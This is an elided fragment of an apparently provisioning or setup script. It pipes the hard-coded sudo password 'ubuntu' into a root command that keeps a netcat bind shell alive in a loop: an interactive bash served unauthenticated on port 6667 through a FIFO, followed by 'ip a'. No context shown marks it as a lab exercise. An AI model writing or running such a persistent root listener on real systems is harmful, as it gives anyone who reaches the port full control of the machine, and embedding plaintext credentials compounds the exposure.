...
# 1. Kill any existing stuck nc processes first
...
echo "ubuntu" | sudo -S nohup bash -c 'while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l -p 6667 > /tmp/f; sleep 1; done' > /dev/null 2>&1 &
    sleep 2
    ip a && sleep 2
    EOT
  ]
